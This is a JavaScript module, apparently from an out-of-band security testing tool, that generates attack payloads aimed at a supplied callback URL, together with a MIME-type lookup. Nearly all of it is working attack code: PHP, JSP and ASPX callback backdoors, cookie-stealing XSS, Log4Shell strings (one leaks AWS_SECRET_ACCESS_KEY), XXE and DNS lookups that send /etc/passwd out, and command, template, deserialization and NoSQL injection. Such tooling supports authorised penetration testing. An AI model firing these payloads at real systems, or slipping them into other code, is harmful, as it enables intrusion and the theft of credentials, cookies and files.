export const scriptTemplates = {
  // Shell scripts
  shell: {
    bash: (callbackUrl) => `#!/bin/bash
# Callback test script
curl -X POST "${callbackUrl}" \\
  -H "Content-Type: application/json" \\
  -d '{"test": "data", "timestamp": "'$(date +%s)'"}'
`,
    sh: (callbackUrl) => `#!/bin/sh
# Simple callback script
wget -qO- --post-data='{"test":"data"}' \\
  --header='Content-Type: application/json' \\
  "${callbackUrl}"
`
  },

  // PHP backdoors/shells
  backdoor: {
    php: (callbackUrl) => `<?php
// Simple PHP callback
$data = array(
    'hostname' => gethostname(),
    'php_version' => phpversion(),
    'server_software' => $_SERVER['SERVER_SOFTWARE'],
    'document_root' => $_SERVER['DOCUMENT_ROOT'],
    'timestamp' => time()
);

$ch = curl_init('${callbackUrl}');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);
?>`,
    jsp: (callbackUrl) => `<%@ page import="java.net.*,java.io.*" %>
<%
// JSP callback
String callbackUrl = "${callbackUrl}";
String data = "hostname=" + InetAddress.getLocalHost().getHostName();
URL url = new URL(callbackUrl);
HttpURLConnection conn = (HttpURLConnection) url.openConnection();
conn.setDoOutput(true);
conn.setRequestMethod("POST");
OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());
writer.write(data);
writer.flush();
writer.close();
conn.getResponseCode();
%>`,
    aspx: (callbackUrl) => `<%@ Page Language="C#" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Text" %>
<%
// ASPX callback
string callbackUrl = "${callbackUrl}";
string data = "hostname=" + System.Environment.MachineName;
using (WebClient client = new WebClient())
{
    client.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
    client.UploadString(callbackUrl, data);
}
%>`
  },

  // Command execution
  cmd: {
    bat: (callbackUrl) => `@echo off
REM Windows batch callback
curl -X POST "${callbackUrl}" -d "hostname=%COMPUTERNAME%&user=%USERNAME%"
`,
    ps1: (callbackUrl) => `# PowerShell callback script
$data = @{
    hostname = $env:COMPUTERNAME
    user = $env:USERNAME
    timestamp = Get-Date -UFormat %s
}
Invoke-RestMethod -Uri "${callbackUrl}" -Method Post -Body ($data | ConvertTo-Json) -ContentType "application/json"
`,
    py: (callbackUrl) => `#!/usr/bin/env python3
import requests
import platform
import json
from datetime import datetime

# Python callback script
data = {
    'hostname': platform.node(),
    'platform': platform.system(),
    'python_version': platform.python_version(),
    'timestamp': datetime.now().isoformat()
}

requests.post('${callbackUrl}', json=data)
`
  },

  // Web-based callbacks
  web: {
    html: (callbackUrl) => `<!DOCTYPE html>
<html>
<head>
    <title>Callback Test</title>
</head>
<body>
    <h1>Callback Test Page</h1>
    <script>
        fetch('${callbackUrl}', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                timestamp: Date.now()
            })
        });
    </script>
</body>
</html>`,
    js: (callbackUrl) => `// JavaScript callback
fetch('${callbackUrl}', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        userAgent: navigator.userAgent,
        location: window.location.href,
        timestamp: Date.now()
    })
}).then(r => r.text()).then(console.log);
`,
    xml: (callbackUrl) => `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "${callbackUrl}">
]>
<root>
  <data>&xxe;</data>
</root>`
  },

  // SQL injection callbacks
  sql: {
    mssql: (callbackUrl) => `-- MSSQL callback (requires xp_cmdshell)
EXEC master..xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri ${callbackUrl} -Method POST"'
`,
    mysql: (callbackUrl) => `-- MySQL callback (using LOAD_FILE and outfile)
SELECT LOAD_FILE('${callbackUrl}');
`,
    oracle: (callbackUrl) => `-- Oracle callback
SELECT UTL_HTTP.REQUEST('${callbackUrl}') FROM DUAL;
`
  },

  // XXE (XML External Entity) payloads
  xxe: {
    dtd: (callbackUrl) => `<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '${callbackUrl}?data=%file;'>">
%eval;
%exfiltrate;`,
    xml: (callbackUrl) => `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "${callbackUrl}">
]>
<root>
  <callback>&xxe;</callback>
</root>`,
    svg: (callbackUrl) => `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "${callbackUrl}">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20">&xxe;</text>
</svg>`,
    docx: (callbackUrl) => `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "${callbackUrl}/evil.dtd">
  %remote;
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
  </w:body>
</w:document>`,
    xlsx: (callbackUrl) => `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "${callbackUrl}">
]>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetData>
    <row r="1">
      <c t="inlineStr"><is><t>&xxe;</t></is></c>
    </row>
  </sheetData>
</worksheet>`
  },

  // SSRF (Server-Side Request Forgery) payloads
  ssrf: {
    url: (callbackUrl) => `${callbackUrl}`,
    xml: (callbackUrl) => `<?xml version="1.0"?>
<root>
  <url>${callbackUrl}</url>
</root>`,
    json: (callbackUrl) => `{
  "url": "${callbackUrl}",
  "callback": "${callbackUrl}",
  "webhook": "${callbackUrl}"
}`,
    yaml: (callbackUrl) => `url: ${callbackUrl}
callback: ${callbackUrl}
webhook: ${callbackUrl}`,
    html: (callbackUrl) => `<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="refresh" content="0;url=${callbackUrl}">
</head>
<body>
  <img src="${callbackUrl}/image.png">
  <iframe src="${callbackUrl}"></iframe>
</body>
</html>`
  },

  // Template Injection payloads
  template: {
    jinja2: (callbackUrl) => `{{ ''.__class__.__mro__[1].__subclasses__()[408]('curl ${callbackUrl}',shell=True,stdout=-1).communicate() }}`,
    freemarker: (callbackUrl) => `<#assign ex="freemarker.template.utility.Execute"?new()> \${ex("curl ${callbackUrl}")}`,
    velocity: (callbackUrl) => `#set($x='')
#set($rt = $x.class.forName('java.lang.Runtime'))
#set($chr = $x.class.forName('java.lang.Character'))
#set($str = $x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('curl ${callbackUrl}'))
$ex.waitFor()`,
    twig: (callbackUrl) => `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("curl ${callbackUrl}")}}`
  },

  // Deserialization payloads
  deserial: {
    java: (callbackUrl) => `// Java deserialization payload
// Requires ysoserial tool to generate proper serialized object
// Example: java -jar ysoserial.jar CommonsCollections1 "curl ${callbackUrl}" | base64
H4sIAAAAAAAAAJ...base64_payload_here...==`,
    php: (callbackUrl) => `O:8:"stdClass":1:{s:4:"exec";s:${callbackUrl.length}:"${callbackUrl}";}`,
    python: (callbackUrl) => `cos
system
(S'curl ${callbackUrl}'
tR.`,
    dotnet: (callbackUrl) => `<ObjectDataProvider MethodName="Start" ObjectType="{x:Type Process}">
  <ObjectDataProvider.MethodParameters>
    <system:String>cmd</system:String>
    <system:String>/c curl ${callbackUrl}</system:String>
  </ObjectDataProvider.MethodParameters>
</ObjectDataProvider>`
  },

  // XSS (Cross-Site Scripting) payloads
  xss: {
    basic: (callbackUrl) => `<script>fetch('${callbackUrl}?cookie='+document.cookie)</script>`,
    img: (callbackUrl) => `<img src=x onerror="fetch('${callbackUrl}?xss=img&cookie='+document.cookie)">`,
    svg: (callbackUrl) => `<svg onload="fetch('${callbackUrl}?xss=svg&data='+btoa(document.domain))">`,
    iframe: (callbackUrl) => `<iframe src="javascript:fetch('${callbackUrl}?xss=iframe&origin='+location.href)">`,
    polyglot: (callbackUrl) => `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=fetch('${callbackUrl}') )//</script>`,
    dom: (callbackUrl) => `<img src=x id="xss"><script>document.getElementById('xss').onerror=()=>fetch('${callbackUrl}?dom=1')</script>`,
    stored: (callbackUrl) => `<img src=x onerror="this.src='${callbackUrl}?stored=1&user='+encodeURIComponent(document.cookie)">`,
    blind: (callbackUrl) => `<script>navigator.sendBeacon('${callbackUrl}',JSON.stringify({url:location.href,cookie:document.cookie}))</script>`
  },

  // Log4Shell / JNDI Injection
  log4j: {
    basic: (callbackUrl) => `\${jndi:ldap://${callbackUrl.replace(/^https?:\/\//, '')}/a}`,
    nested: (callbackUrl) => `\${jndi:\${lower:l}\${lower:d}a\${lower:p}://${callbackUrl.replace(/^https?:\/\//, '')}/exploit}`,
    obfuscated: (callbackUrl) => `\${jndi:ldap://\${env:USER}.\${hostName}.${callbackUrl.replace(/^https?:\/\//, '')}}`,
    rmi: (callbackUrl) => `\${jndi:rmi://${callbackUrl.replace(/^https?:\/\//, '')}/Exploit}`,
    dns: (callbackUrl) => `\${jndi:dns://${callbackUrl.replace(/^https?:\/\//, '')}/a}`,
    bypass: (callbackUrl) => `\${jndi:ldap://127.0.0.1#${callbackUrl.replace(/^https?:\/\//, '')}:1389/a}`,
    header: (callbackUrl) => `\${jndi:ldap://${callbackUrl.replace(/^https?:\/\//, '')}/\${env:AWS_SECRET_ACCESS_KEY}}`
  },

  // NoSQL Injection
  nosql: {
    mongodb: (callbackUrl) => `{"$where": "this.password.match(/.*/) && fetch('${callbackUrl}?pass='+this.password)"}`,
    json: (callbackUrl) => `{"username": {"$ne": null}, "password": {"$ne": null}, "callback": "${callbackUrl}"}`,
    timing: (callbackUrl) => `{"$where": "sleep(5000) && fetch('${callbackUrl}')"}`,
    blind: (callbackUrl) => `admin' && this.password.match(/^a.*/) && fetch('${callbackUrl}?found=a') && 'a'=='a`,
    injection: (callbackUrl) => `'; fetch('${callbackUrl}?db='+db.getName()); var x='`
  },

  // Command Injection
  cmdinj: {
    linux: (callbackUrl) => `; curl ${callbackUrl}?user=\`whoami\` ;`,
    windows: (callbackUrl) => `& curl ${callbackUrl}?user=%USERNAME% &`,
    pipe: (callbackUrl) => `| curl -d "hostname=\$(hostname)" ${callbackUrl} |`,
    backtick: (callbackUrl) => `\`curl ${callbackUrl}?pwd=\\\`pwd\\\`\``,
    blind: (callbackUrl) => `; nslookup \`whoami\`.${callbackUrl.replace(/^https?:\/\//, '')} ;`,
    time: (callbackUrl) => `; sleep 5 && curl ${callbackUrl}?delay=5 ;`
  },

  // DNS Exfiltration & Blind XXE
  dns: {
    exfil: (callbackUrl) => `nslookup \$(whoami).${callbackUrl.replace(/^https?:\/\//, '')}`,
    xxe: (callbackUrl) => `<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://${callbackUrl.replace(/^https?:\/\//, '')}/?%data;'>">`,
    dtd: (callbackUrl) => `<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % dtd SYSTEM "${callbackUrl}/evil.dtd">
%dtd;
%send;`,
    windows: (callbackUrl) => `nslookup %USERNAME%.%COMPUTERNAME%.${callbackUrl.replace(/^https?:\/\//, '')}`,
    base64: (callbackUrl) => `nslookup \$(cat /etc/passwd | base64 | cut -c1-60).${callbackUrl.replace(/^https?:\/\//, '')}`
  },

  // LDAP Injection
  ldap: {
    basic: (callbackUrl) => `*)(uid=*))(|(uid=*`,
    blind: (callbackUrl) => `*)(objectClass=*))(&(objectClass=void`,
    callback: (callbackUrl) => `admin)(&(password=*)(description=${callbackUrl}`,
    timing: (callbackUrl) => `*)(cn=*))%00(&(cn=admin)(userPassword=*))(cn=${callbackUrl}`
  },

  // CRLF / Header Injection
  crlf: {
    response: (callbackUrl) => `%0d%0aLocation:%20${callbackUrl}%0d%0a%0d%0a`,
    cookie: (callbackUrl) => `test%0d%0aSet-Cookie:%20callback=${callbackUrl}`,
    xss: (callbackUrl) => `%0d%0a%0d%0a<script>fetch('${callbackUrl}')</script>`,
    redirect: (callbackUrl) => `\r\nLocation: ${callbackUrl}\r\n\r\n`
  },

  // WebSocket
  websocket: {
    js: (callbackUrl) => `const ws = new WebSocket('${callbackUrl.replace(/^http/, 'ws')}');
ws.onopen = () => ws.send(JSON.stringify({
  type: 'callback',
  data: document.cookie,
  origin: location.href
}));`,
    python: (callbackUrl) => `import websocket
ws = websocket.WebSocket()
ws.connect('${callbackUrl.replace(/^http/, 'ws')}')
ws.send('{"type":"callback","hostname":"' + socket.gethostname() + '"}')`,
    node: (callbackUrl) => `const WebSocket = require('ws');
const ws = new WebSocket('${callbackUrl.replace(/^http/, 'ws')}');
ws.on('open', () => {
  ws.send(JSON.stringify({host: require('os').hostname()}));
});`
  },

  // GraphQL Injection
  graphql: {
    introspection: (callbackUrl) => `{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
# Callback: ${callbackUrl}`,
    mutation: (callbackUrl) => `mutation {
  sendCallback(url: "${callbackUrl}") {
    success
  }
}`,
    query: (callbackUrl) => `query {
  users {
    id
    username
    email
  }
}
# Exfil to: ${callbackUrl}`,
    injection: (callbackUrl) => `{user(id: "1' UNION SELECT NULL, '${callbackUrl}', NULL--"){ name }}`
  },

  // Additional Languages
  languages: {
    go: (callbackUrl) => `package main
import (
    "net/http"
    "os"
)
func main() {
    hostname, _ := os.Hostname()
    http.Get("${callbackUrl}?host=" + hostname)
}`,
    ruby: (callbackUrl) => `require 'net/http'
require 'socket'
uri = URI('${callbackUrl}')
uri.query = "host=#{Socket.gethostname}"
Net::HTTP.get(uri)`,
    perl: (callbackUrl) => `#!/usr/bin/perl
use LWP::UserAgent;
use Sys::Hostname;
my $ua = LWP::UserAgent->new;
$ua->get('${callbackUrl}?host=' . hostname);`,
    nodejs: (callbackUrl) => `const https = require('https');
const os = require('os');
https.get('${callbackUrl}?host=' + os.hostname(), (resp) => {
  console.log('Callback sent');
});`,
    rust: (callbackUrl) => `use reqwest;
use std::process;
#[tokio::main]
async fn main() {
    let hostname = hostname::get().unwrap();
    reqwest::get("${callbackUrl}?host=".to_owned() + hostname.to_str().unwrap())
        .await.unwrap();
}`
  },

  // JWT / OAuth
  jwt: {
    none: (callbackUrl) => `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImNhbGxiYWNrIjoiJHtjYWxsYmFja1VybH0ifQ.`,
    weak: (callbackUrl) => `// Weak secret: 'secret'
// Callback URL embedded: ${callbackUrl}
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImNhbGxiYWNrIjoiJHtjYWxsYmFja1VybH0ifQ.signature`,
    kid: (callbackUrl) => `{"alg":"HS256","typ":"JWT","kid":"${callbackUrl}/jwk.json"}`,
    jku: (callbackUrl) => `{"alg":"RS256","typ":"JWT","jku":"${callbackUrl}/jwks.json"}`
  },

  oauth: {
    redirect: (callbackUrl) => `${callbackUrl}`,
    openredirect: (callbackUrl) => `https://trusted.com@${callbackUrl.replace(/^https?:\/\//, '')}`,
    xss: (callbackUrl) => `javascript:fetch('${callbackUrl}?token='+location.hash)`
  },

  // Polyglot / File Upload Bypass
  polyglot: {
    gifjs: (callbackUrl) => `GIF89a/*<script>fetch('${callbackUrl}')</script>*/`,
    jpgphp: (callbackUrl) => `\xFF\xD8\xFF\xE0<?php system("curl ${callbackUrl}"); ?>`,
    pdfjs: (callbackUrl) => `%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/Parent 2 0 R/Resources<</Font<</F1<</Type/Font/Subtype/Type1/BaseFont/Arial>>>>>>>/MediaBox[0 0 612 792]/Contents 4 0 R>>endobj
4 0 obj<</Length 44>>stream
BT /F1 12 Tf 100 700 Td (Callback: ${callbackUrl}) Tj ET
endstream endobj
xref 0 5
trailer<</Size 5/Root 1 0 R>>
startxref 273
%%EOF`,
    svg: (callbackUrl) => `<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('${callbackUrl}')">
  <script>alert('XSS')</script>
</svg>`,
    htaccess: (callbackUrl) => `AddType application/x-httpd-php .jpg
# Callback: ${callbackUrl}`
  },

  // IDOR / API Testing
  api: {
    rest: (callbackUrl) => `GET /api/users/1 HTTP/1.1
Host: target.com
X-Callback: ${callbackUrl}
Authorization: Bearer token_here`,
    graphql: (callbackUrl) => `POST /graphql HTTP/1.1
Content-Type: application/json
X-Callback: ${callbackUrl}

{"query":"{ users { id email } }"}`,
    soap: (callbackUrl) => `<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Callback>${callbackUrl}</Callback>
  </soap:Body>
</soap:Envelope>`
  }
};

export const getMimeType = (format) => {
  const mimeTypes = {
    // Shell
    bash: 'application/x-sh',
    sh: 'application/x-sh',

    // PHP/Web backends
    php: 'application/x-httpd-php',
    jsp: 'application/x-jsp',
    aspx: 'text/plain',

    // Command scripts
    bat: 'application/bat',
    ps1: 'application/x-powershell',
    py: 'text/x-python',

    // Web
    html: 'text/html',
    js: 'application/javascript',
    xml: 'application/xml',

    // SQL
    mssql: 'text/plain',
    mysql: 'text/plain',
    oracle: 'text/plain',

    // XXE
    dtd: 'application/xml-dtd',
    svg: 'image/svg+xml',
    docx: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    xlsx: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',

    // SSRF
    url: 'text/plain',
    json: 'application/json',
    yaml: 'application/x-yaml',

    // Template Injection
    jinja2: 'text/plain',
    freemarker: 'text/plain',
    velocity: 'text/plain',
    twig: 'text/plain',

    // Deserialization
    java: 'application/octet-stream',
    dotnet: 'application/xml',
    python: 'text/plain',

    // XSS
    basic: 'text/html',
    img: 'text/html',
    iframe: 'text/html',
    polyglot: 'text/html',
    dom: 'text/html',
    stored: 'text/html',
    blind: 'text/html',

    // Log4j
    nested: 'text/plain',
    obfuscated: 'text/plain',
    rmi: 'text/plain',
    dns: 'text/plain',
    bypass: 'text/plain',
    header: 'text/plain',

    // NoSQL
    mongodb: 'application/json',
    timing: 'application/json',
    injection: 'text/plain',

    // Command Injection
    linux: 'text/plain',
    windows: 'text/plain',
    pipe: 'text/plain',
    backtick: 'text/plain',
    time: 'text/plain',

    // DNS
    exfil: 'text/plain',
    xxe: 'application/xml-dtd',
    base64: 'text/plain',

    // LDAP
    callback: 'text/plain',

    // CRLF
    response: 'text/plain',
    cookie: 'text/plain',
    redirect: 'text/plain',

    // WebSocket
    node: 'application/javascript',

    // GraphQL
    introspection: 'application/graphql',
    mutation: 'application/graphql',
    query: 'application/graphql',

    // Languages
    go: 'text/x-go',
    ruby: 'text/x-ruby',
    perl: 'text/x-perl',
    nodejs: 'application/javascript',
    rust: 'text/x-rust',

    // JWT/OAuth
    none: 'text/plain',
    weak: 'text/plain',
    kid: 'text/plain',
    jku: 'text/plain',
    openredirect: 'text/plain',

    // Polyglot
    gifjs: 'image/gif',
    jpgphp: 'image/jpeg',
    pdfjs: 'application/pdf',
    htaccess: 'text/plain',

    // API
    rest: 'text/plain',
    graphql: 'application/graphql',
    soap: 'application/soap+xml',

    // Default
    txt: 'text/plain'
  };

  return mimeTypes[format] || 'text/plain';
};
